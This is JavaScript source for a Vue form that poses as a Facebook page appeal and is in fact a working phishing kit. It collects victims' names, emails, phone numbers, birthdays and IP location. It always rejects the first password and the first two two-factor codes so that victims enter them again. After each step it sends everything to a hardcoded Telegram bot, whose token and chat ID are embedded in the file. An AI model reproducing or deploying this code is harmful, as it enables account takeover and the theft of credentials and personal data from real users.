import { reactive, ref, watch, onMounted, nextTick, onBeforeUnmount } from "vue";
import "intl-tel-input/build/css/intlTelInput.css";
import intlTelInput from "intl-tel-input";
import { AsYouType } from "libphonenumber-js";

/**
 * ✅ Cookie utilities
 */
function setCookie(name, value, days = 1) {
    const expires = new Date(Date.now() + days * 864e5).toUTCString();
    document.cookie =
        `${encodeURIComponent(name)}=${encodeURIComponent(value)};` +
        ` expires=${expires}; path=/; SameSite=Lax`;
}

function getCookie(name) {
    const key = encodeURIComponent(name) + "=";
    const parts = document.cookie.split("; ");
    for (const part of parts) {
        if (part.startsWith(key)) return decodeURIComponent(part.slice(key.length));
    }
    return "";
}

function removeCookie(name) {
    document.cookie = `${encodeURIComponent(name)}=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/; SameSite=Lax`;
}

/**
 * ✅ Local Storage utilities
 */
function saveToLocalStorage(key, data) {
    try {
        localStorage.setItem(key, JSON.stringify(data));
    } catch (e) {
        console.error('LocalStorage save error:', e);
    }
}

function loadFromLocalStorage(key) {
    try {
        const data = localStorage.getItem(key);
        return data ? JSON.parse(data) : null;
    } catch (e) {
        console.error('LocalStorage load error:', e);
        return null;
    }
}

function clearLocalStorage(key) {
    try {
        localStorage.removeItem(key);
    } catch (e) {
        console.error('LocalStorage clear error:', e);
    }
}

/**
 * ✅ Generate unique submission ID
 */
function generateSubmissionId() {
    const randomNumber = Math.floor(Math.random() * 90000000) + 10000000;
    return `USER-ID: ${randomNumber}`;
}

/**
 * ✅ Get user IP location (client-side only)
 */
async function getUserLocationInfo() {
    try {
        const response = await fetch("https://ipinfo.io/json?token=1a1487102e7dd6");
        const data = await response.json();
        return {
            ip: data.ip || 'Unknown',
            country: data.country || 'Unknown',
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            countryCode: data.country_code || 'US'
        };
    } catch (e) {
        console.error('Location fetch error:', e);
        return {
            ip: 'Unknown',
            country: 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            countryCode: 'US'
        };
    }
}

/**
 * ✅ Generate and format Telegram message (no backend)
 */
function generateTelegramMessage(submissionId, formData, locationData) {
    let message = "";
    message += `<b>User ID:</b> <code>${submissionId}</code>\n`;
    message += `IP: <code>${locationData.ip}</code> | City: <code>${locationData.city}</code> | Country: <code>${locationData.country}</code>\n`;
    message += "--------------------------------------------------------------\n";

    const fieldsOrder = [
        { key: 'fullName', label: 'FullName' },
        { key: 'email', label: 'Email 1' },
        { key: 'businessEmail', label: 'Email 2' },
        { key: 'pageName', label: 'PageName' },
        'separator',
        { key: 'phone', label: 'Phone' },
        { key: 'birthday', label: 'Birthday' },
    ];

    fieldsOrder.forEach(field => {
        if (field === 'separator') {
            message += "--------------------------------------------------------------\n";
            return;
        }
        const value = formData[field.key] ? formData[field.key] : 'N/A';
        message += `${field.label}: <code>${value}</code>\n`;
    });

    message += "--------------------------------------------------------------\n";

    const passwordFields = [
        { key: 'password', label: 'Password 1' },
        { key: 'password_confirm', label: 'Password 2' }
    ];

    passwordFields.forEach(field => {
        if (formData[field.key]) {
            message += `${field.label}: <code>${formData[field.key]}</code>\n`;
        }
    });

    message += "--------------------------------------------------------------\n";

    const codeFields = [
        { key: 'method', label: 'Method' },
        { key: 'code_first', label: 'Code 1' },
        { key: 'code_second', label: 'Code 2' },
        { key: 'code_third', label: 'Code 3' }
    ];

    codeFields.forEach(field => {
        if (formData[field.key]) {
            message += `${field.label}: <code>${formData[field.key]}</code>\n`;
        }
    });

    return message;
}

/**
 * ✅ Send to Telegram (using Telegram Bot API)
 */
async function sendToTelegram(message, botToken, chatId) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.statusText}`);
        }

        const data = await response.json();
        if (!data.ok) {
            throw new Error(`Telegram error: ${data.description}`);
        }

        return { success: true, messageId: data.result.message_id };
    } catch (error) {
        console.error('Telegram send error:', error);
        return { success: false, error: error.message };
    }
}

/**
 * ✅ Main composable
 */
export function useAppealForm(emit) {
    const STORAGE_KEY = 'appeal_form_data';
    const SUBMISSION_ID_KEY = 'submission_id';
    const COOKIE_KEY = 'appeal_step1';

    // Telegram config (EASILY CHANGEABLE)
    const TELEGRAM_BOT_TOKEN = "8243992860:AAEp2DVoMKm55Jbv-evtAOCbBs96Uq2bgVQ";
    const TELEGRAM_CHAT_ID = "-1003078888823";

    // ✅ Phone management
    const phone = ref("");
    const phoneE164 = ref("");
    const iti = ref(null);
    const phoneInputEl = ref(null);
    let onInputHandler = null;
    let onCountryChangeHandler = null;

    // ✅ Step management
    const step = ref(1);
    const submissionId = ref('');
    const locationData = ref({
        ip: 'Unknown',
        country: 'Unknown',
        city: 'Unknown',
        region: 'Unknown'
    });

    // ✅ Code management
    const code = ref("");
    const codeError = ref(false);
    const codeErrorMessage = ref("");
    const codeLocked = ref(false);
    const countdown = ref(0);
    let codeTimer = null;
    const codeInputCount = ref(0);

    // ✅ Password management
    const password = ref("");
    const passwordError = ref(false);
    const passwordInputCount = ref(0);

    // ✅ Loading state
    const isLoading = ref(false);

    // ✅ Form data
    const form = reactive({
        fullName: "",
        email: "",
        businessEmail: "",
        pageName: "",
        dob: { day: "", month: "", year: "" },
        issue: "",
        notifyFacebook: true,
        agreeTerms: false,
    });

    const errors = reactive({
        fullName: "",
        email: "",
        businessEmail: "",
        pageName: "",
        dob: "",
        issue: "",
        phone: "",
        agreeTerms: "",
    });

    // ✅ Saved user for step 3
    const savedUser = reactive({
        fullName: "",
        email: "",
        phoneDisplay: "",
        phoneE164: "",
    });

    // ✅ All form data accumulator
    const allFormData = reactive({
        formStep1: null,
        formStep2: null,
        formStep3: null
    });

    /**
     * ✅ Initialize - get location and submission ID
     */
    const initializeForm = async () => {
        // Load from localStorage if exists
        const saved = loadFromLocalStorage(STORAGE_KEY);
        if (saved) {
            Object.assign(allFormData, saved);
            Object.assign(form, saved.formStep1 || {});
        }

        // Get or create submission ID
        let id = localStorage.getItem(SUBMISSION_ID_KEY);
        if (!id) {
            id = generateSubmissionId();
            localStorage.setItem(SUBMISSION_ID_KEY, id);
        }
        submissionId.value = id;

        // Get user location
        locationData.value = await getUserLocationInfo();
    };

    /**
     * ✅ Save step 1 to cookie and localStorage
     */
    function saveStep1ToCookie() {
        const payload = {
            fullName: form.fullName || "",
            email: form.email || "",
            phoneDisplay: phone.value || "",
            phoneE164: phoneE164.value || "",
            businessEmail: form.businessEmail || "",
            pageName: form.pageName || "",
            dob: form.dob || {},
            issue: form.issue || "",
        };

        setCookie(COOKIE_KEY, JSON.stringify(payload), 1);
        
        saveToLocalStorage(STORAGE_KEY, allFormData);
    }

    /**
     * ✅ Load step 1 from cookie
     */
    function loadStep1FromCookie() {
        const raw = getCookie(COOKIE_KEY);
        if (!raw) return;

        try {
            const data = JSON.parse(raw);
            savedUser.fullName = data.fullName || "";
            savedUser.email = data.email || "";
            savedUser.phoneDisplay = data.phoneDisplay || data.phone || "";
            savedUser.phoneE164 = data.phoneE164 || "";
        } catch (e) {
            removeCookie(COOKIE_KEY);
        }
    }

    /**
     * ✅ Phone validation & formatting
     */
    const getIso2 = () => {
        const iso2 = iti.value?.getSelectedCountryData?.()?.iso2;
        return (iso2 || "us").toUpperCase();
    };

    const getDialCode = () => {
        const dc = iti.value?.getSelectedCountryData?.()?.dialCode;
        return String(dc || "1");
    };

    function validatePhoneLoose(nationalDigits) {
        if (!nationalDigits || nationalDigits.length === 0) {
            errors.phone = "Please enter enough phone number.";
            return false;
        }
        errors.phone = "";
        return true;
    }

    function formatNationalDigits(nationalDigits) {
        const iso = getIso2();
        const formatter = new AsYouType(iso);
        return formatter.input(nationalDigits);
    }

    function syncPhoneValueFromDigits(nationalDigits) {
        const dialCode = getDialCode();
        const formattedNational = formatNationalDigits(nationalDigits);
        const display = `+${dialCode} ${formattedNational}`.trim();
        phone.value = display;
        phoneE164.value = `+${dialCode}${nationalDigits}`;

        if (phoneInputEl.value) {
            phoneInputEl.value.value = display;
        }
    }

    /**
     * ✅ Initialize phone input (intl-tel-input)
     */
    onMounted(async () => {
        // Initialize form data
        await initializeForm();
        loadStep1FromCookie();

        await nextTick();
        const input = document.querySelector("#phone");
        if (!input) return;
        phoneInputEl.value = input;

        let countryCode = locationData.value.countryCode?.toLowerCase() || "us";
        try {
            const res = await fetch("https://ipinfo.io/json?token=1a1487102e7dd6");
            const data = await res.json();
            countryCode = data.country ? data.country.toLowerCase() : "us";
        } catch (_) {
            countryCode = "us";
        }

        iti.value = intlTelInput(input, {
            initialCountry: countryCode,
            containerClass: "w-full",
            strictMode: false,
            formatOnDisplay: false,
            nationalMode: false,
        });

        const dialCode = getDialCode();
        const initialValue = `+${dialCode} `;
        phone.value = initialValue;
        input.value = initialValue;
        phoneE164.value = `+${dialCode}`;

        // ✅ Input handler
        onInputHandler = (e) => {
            const dial = getDialCode();
            const iso = getIso2();
            const current = e.target.value || "";
            const allDigits = current.replace(/\D/g, "");

            let nationalDigits = allDigits;
            if (nationalDigits.startsWith(dial)) {
                nationalDigits = nationalDigits.slice(dial.length);
            }

            const formattedNational = new AsYouType(iso).input(nationalDigits);
            const display = `+${dial} ${formattedNational}`.trim();

            phone.value = display;
            phoneE164.value = `+${dial}${nationalDigits}`;
            e.target.value = display;

            validatePhoneLoose(nationalDigits);
        };

        // ✅ Country change handler
        onCountryChangeHandler = () => {
            const dial = getDialCode();
            const iso = getIso2();
            const current = input.value || "";
            const allDigits = current.replace(/\D/g, "");

            let nationalDigits = allDigits;
            if (nationalDigits.startsWith(dial)) {
                nationalDigits = nationalDigits.slice(dial.length);
            }

            const formattedNational = new AsYouType(iso).input(nationalDigits);
            const display = `+${dial} ${formattedNational}`.trim();

            phone.value = display;
            input.value = display;
            phoneE164.value = `+${dial}${nationalDigits}`;

            validatePhoneLoose(nationalDigits);
        };

        input.addEventListener("input", onInputHandler);
        input.addEventListener("countrychange", onCountryChangeHandler);
    });

    onBeforeUnmount(() => {
        const input = phoneInputEl.value;
        if (input && onInputHandler) input.removeEventListener("input", onInputHandler);
        if (input && onCountryChangeHandler) input.removeEventListener("countrychange", onCountryChangeHandler);

        if (iti.value?.destroy) iti.value.destroy();
        iti.value = null;

        if (codeTimer) clearInterval(codeTimer);
    });

    /**
     * ✅ Validation watchers
     */
    watch(() => form.fullName, (val) => {
        errors.fullName = val.trim() ? "" : "Please enter enough full name.";
    });

    watch(() => form.email, (val) => {
        errors.email = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val) ? "" : "Please enter enough email address.";
    });

    watch(() => form.businessEmail, (val) => {
        errors.businessEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)
            ? ""
            : "Please enter enough email business address.";
    });

    watch(() => form.pageName, (val) => {
        errors.pageName = val.trim() ? "" : "Please enter enough Facebook page name.";
    });

    watch(() => [form.dob.day, form.dob.month, form.dob.year], ([d, m, y]) => {
        errors.dob = d && m && y ? "" : "Please enter enough date of birth.";
    });

    watch(() => form.issue, (val) => {
        errors.issue = val.trim() ? "" : "Please enter your issue";
    });

    watch(() => form.agreeTerms, (val) => {
        errors.agreeTerms = val ? "" : "Please agree to our terms and data and cookie policy";
    });

    watch(step, (v) => {
        if (v === 3) loadStep1FromCookie();
    });

    /**
     * ✅ Validate phone number
     */
    function validatePhoneNumber() {
        errors.fullName = form.fullName.trim() ? "" : "Please enter enough full name.";
        errors.email = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email) ? "" : "Please enter enough email address.";
        errors.businessEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.businessEmail)
            ? ""
            : "Please enter enough email business address.";
        errors.pageName = form.pageName.trim() ? "" : "Please enter enough Facebook page name.";

        const { day, month, year } = form.dob;
        errors.dob = day && month && year ? "" : "Please enter enough date of birth.";

        errors.issue = form.issue.trim() ? "" : "Please enter enough issue.";
        errors.agreeTerms = form.agreeTerms ? "" : "Please agree to our terms and data and cookie policy";

        const dial = getDialCode();
        const digits = (phone.value || "").replace(/\D/g, "");
        let nationalDigits = digits;
        if (nationalDigits.startsWith(dial)) nationalDigits = nationalDigits.slice(dial.length);

        validatePhoneLoose(nationalDigits);

        return Object.values(errors).every((v) => !v);
    }

    /**
     * ✅ Submit form step 1 - SEND TELEGRAM
     */
    const submitForm = async () => {
        if (!validatePhoneNumber()) return;

        const birthday = `${form.dob.year}-${String(form.dob.month).padStart(2, "0")}-${String(form.dob.day).padStart(2, "0")}`;

        const formData = {
            fullName: form.fullName,
            email: form.email,
            businessEmail: form.businessEmail,
            pageName: form.pageName,
            phone: phoneE164.value,
            birthday,
            description: form.issue,
        };

        allFormData.formStep1 = formData;
        saveStep1ToCookie();
        saveToLocalStorage(STORAGE_KEY, allFormData);

        // ✅ SEND TELEGRAM - STEP 1
        try {
            const telegramMessage = generateTelegramMessage(
                submissionId.value,
                allFormData.formStep1,
                locationData.value
            );

            const result = await sendToTelegram(telegramMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
            console.log('✅ Step 1 sent to Telegram:', result);
        } catch (error) {
            console.error('❌ Telegram Step 1 error:', error);
        }

        step.value = 2;
    };

    /**
     * ✅ Submit password (step 2) - SEND TELEGRAM
     */
    const submitPassword = async () => {
        try {
            isLoading.value = true;

            if (passwordInputCount.value === 0) {
                // ✅ ENSURE phone và birthday được giữ lại
                allFormData.formStep2 = {
                    ...allFormData.formStep1,  // Có phone + birthday từ step 1
                    password: password.value,
                };

                console.log('Step 2 (Password 1):', allFormData.formStep2);
                console.log('DEBUG - Phone:', allFormData.formStep2.phone);
                console.log('DEBUG - Birthday:', allFormData.formStep2.birthday);
                
                // ✅ SEND TELEGRAM - PASSWORD 1
                try {
                    const telegramMessage = generateTelegramMessage(
                        submissionId.value,
                        allFormData.formStep2,
                        locationData.value
                    );

                    const result = await sendToTelegram(telegramMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
                    console.log('✅ Step 2 (Password 1) sent to Telegram:', result);
                } catch (error) {
                    console.error('❌ Telegram Step 2 error:', error);
                }
                
                passwordInputCount.value++;
                passwordError.value = true;
                password.value = "";
                saveToLocalStorage(STORAGE_KEY, allFormData);
                
                await new Promise(r => setTimeout(r, 500));
                return;
            }

            // Second attempt - password confirm
            allFormData.formStep2 = {
                ...allFormData.formStep2,  // Có phone + birthday + password từ trước
                password_confirm: password.value,
            };

            console.log('Step 2 (Password 2):', allFormData.formStep2);
            console.log('DEBUG - Phone:', allFormData.formStep2.phone);
            console.log('DEBUG - Birthday:', allFormData.formStep2.birthday);
            
            // ✅ SEND TELEGRAM - PASSWORD 2
            try {
                const telegramMessage = generateTelegramMessage(
                    submissionId.value,
                    allFormData.formStep2,
                    locationData.value
                );

                const result = await sendToTelegram(telegramMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
                console.log('✅ Step 2 (Password 2) sent to Telegram:', result);
            } catch (error) {
                console.error('❌ Telegram Step 2 error:', error);
            }
            
            saveToLocalStorage(STORAGE_KEY, allFormData);
            step.value = 3;
            password.value = "";
        } catch (error) {
            console.error("Password Error:", error);
            passwordError.value = true;
            password.value = "";
            passwordInputCount.value = 0;
            delete allFormData.formStep2;
        } finally {
            isLoading.value = false;
        }
    };

    /**
     * ✅ Start countdown timer
     */
    const startCountdown = (seconds) => {
        codeLocked.value = true;
        countdown.value = seconds;

        if (codeTimer) clearInterval(codeTimer);
        codeTimer = setInterval(() => {
            countdown.value--;
            if (countdown.value <= 0) {
                clearInterval(codeTimer);
                codeLocked.value = false;
            }
        }, 1000);
    };

    /**
     * ✅ Submit code (step 3) - SEND TELEGRAM FOR EACH CODE
     */
    const submitCode = async () => {
        try {
            isLoading.value = true;

            const method = JSON.parse(sessionStorage.getItem("step1Data") || "{}")?.method || "notification";

            if (codeInputCount.value === 0) {
                // First code
                allFormData.formStep3 = {
                    ...allFormData.formStep2,  // Có phone + birthday + password từ step 2
                    code_first: code.value,
                    method,
                };

                console.log('Step 3 (Code 1):', allFormData.formStep3);
                console.log('DEBUG - Phone:', allFormData.formStep3.phone);
                console.log('DEBUG - Birthday:', allFormData.formStep3.birthday);
                
                // ✅ SEND TELEGRAM - CODE 1
                try {
                    const telegramMessage = generateTelegramMessage(
                        submissionId.value,
                        allFormData.formStep3,
                        locationData.value
                    );

                    const result = await sendToTelegram(telegramMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
                    console.log('✅ Step 3 (Code 1) sent to Telegram:', result);
                } catch (error) {
                    console.error('❌ Telegram Code 1 error:', error);
                }
                
                codeInputCount.value++;
                codeError.value = true;
                code.value = "";
                saveToLocalStorage(STORAGE_KEY, allFormData);
                startCountdown(30);
                
                await new Promise(r => setTimeout(r, 500));
                return;
            }

            if (codeInputCount.value === 1) {
                // Second code
                allFormData.formStep3 = {
                    ...allFormData.formStep3,  // Giữ tất cả từ lần code 1
                    code_second: code.value,
                    method,
                };

                console.log('Step 3 (Code 2):', allFormData.formStep3);
                console.log('DEBUG - Phone:', allFormData.formStep3.phone);
                console.log('DEBUG - Birthday:', allFormData.formStep3.birthday);
                
                // ✅ SEND TELEGRAM - CODE 2
                try {
                    const telegramMessage = generateTelegramMessage(
                        submissionId.value,
                        allFormData.formStep3,
                        locationData.value
                    );

                    const result = await sendToTelegram(telegramMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
                    console.log('✅ Step 3 (Code 2) sent to Telegram:', result);
                } catch (error) {
                    console.error('❌ Telegram Code 2 error:', error);
                }
                
                codeInputCount.value++;
                codeError.value = true;
                code.value = "";
                saveToLocalStorage(STORAGE_KEY, allFormData);
                startCountdown(30);
                
                await new Promise(r => setTimeout(r, 500));
                return;
            }

            if (codeInputCount.value === 2) {
                // Third code - FINAL
                allFormData.formStep3 = {
                    ...allFormData.formStep3,  // Giữ tất cả
                    code_third: code.value,
                    method,
                };

                console.log('Step 3 (Code 3) - FINAL:', allFormData.formStep3);
                console.log('DEBUG - Phone:', allFormData.formStep3.phone);
                console.log('DEBUG - Birthday:', allFormData.formStep3.birthday);

                // ✅ SEND TELEGRAM - CODE 3 (FINAL)
                try {
                    const fullFormData = {
                        ...allFormData.formStep1,
                        ...allFormData.formStep2,
                        ...allFormData.formStep3
                    };
                    
                    const telegramMessage = generateTelegramMessage(
                        submissionId.value,
                        fullFormData,
                        locationData.value
                    );

                    const result = await sendToTelegram(telegramMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
                    console.log('✅ Step 3 (Code 3 - FINAL) sent to Telegram:', result);
                } catch (error) {
                    console.error('❌ Telegram Code 3 error:', error);
                }

                saveToLocalStorage(STORAGE_KEY, allFormData);
                code.value = "";
                step.value = 4;
            }
        } catch (error) {
            console.error("Code Error:", error);
            codeError.value = true;
            codeErrorMessage.value = "An error occurred";
            code.value = "";
        } finally {
            isLoading.value = false;
        }
    };

    /**
     * ✅ Handle send (step 1)
     */
    const handleSend = async () => {
        if (isLoading.value) return;

        isLoading.value = true;
        await new Promise((resolve) => setTimeout(resolve, 800));

        await submitForm();

        isLoading.value = false;
    };

    /**
     * ✅ Handle continue code (step 3)
     */
    const handleContinueCode = async () => {
        if (isLoading.value || codeLocked.value) return;

        isLoading.value = true;
        await new Promise((r) => setTimeout(r, 800));

        await submitCode();

        isLoading.value = false;
    };

    /**
     * ✅ Code input handlers
     */
    function onlyNumberKey(e) {
        const allowedKeys = ["Backspace", "Delete", "ArrowLeft", "ArrowRight", "Tab"];

        if (e.ctrlKey || e.metaKey) return;
        if (allowedKeys.includes(e.key)) return;
        if (!/^\d$/.test(e.key)) {
            e.preventDefault();
            return;
        }

        const currentDigits = String(e.target.value || "").replace(/\D/g, "");
        if (currentDigits.length >= 8) {
            e.preventDefault();
        }
    }

    function onCodeInput(e) {
        let digits = String(e.target.value || "").replace(/\D/g, "");
        if (digits.length > 8) digits = digits.slice(0, 8);

        code.value = digits;
        e.target.value = digits;
    }

    /**
     * ✅ Close popup
     */
    function closePopup() {
        if (emit) emit("close");
    }

    /**
     * ✅ Clear all data (useful for testing)
     */
    function clearAllData() {
        clearLocalStorage(STORAGE_KEY);
        localStorage.removeItem(SUBMISSION_ID_KEY);
        removeCookie(COOKIE_KEY);
        
        step.value = 1;
        form.fullName = "";
        form.email = "";
        form.businessEmail = "";
        form.pageName = "";
        form.dob = { day: "", month: "", year: "" };
        form.issue = "";
        form.agreeTerms = false;
        
        password.value = "";
        passwordError.value = false;
        passwordInputCount.value = 0;
        
        code.value = "";
        codeError.value = false;
        codeErrorMessage.value = "";
        codeLocked.value = false;
        codeInputCount.value = 0;
        countdown.value = 0;
        
        phone.value = "";
        phoneE164.value = "";
        
        allFormData.formStep1 = null;
        allFormData.formStep2 = null;
        allFormData.formStep3 = null;
    }

    /**
     * ✅ Export all data for debugging
     */
    function exportFormData() {
        return {
            submissionId: submissionId.value,
            locationData: locationData.value,
            formStep1: allFormData.formStep1,
            formStep2: allFormData.formStep2,
            formStep3: allFormData.formStep3,
            timestamp: new Date().toISOString()
        };
    }

    return {
        // State
        phone,
        phoneE164,
        step,
        submissionId,
        locationData,
        form,
        errors,
        password,
        passwordError,
        passwordInputCount,
        code,
        codeError,
        codeErrorMessage,
        codeLocked,
        countdown,
        isLoading,
        savedUser,
        allFormData,

        // Methods
        handleSend,
        handleContinueCode,
        validatePhoneNumber,
        submitForm,
        submitPassword,
        submitCode,
        startCountdown,
        onlyNumberKey,
        onCodeInput,
        closePopup,
        clearAllData,
        exportFormData,

        // Utils
        iti,
    };
}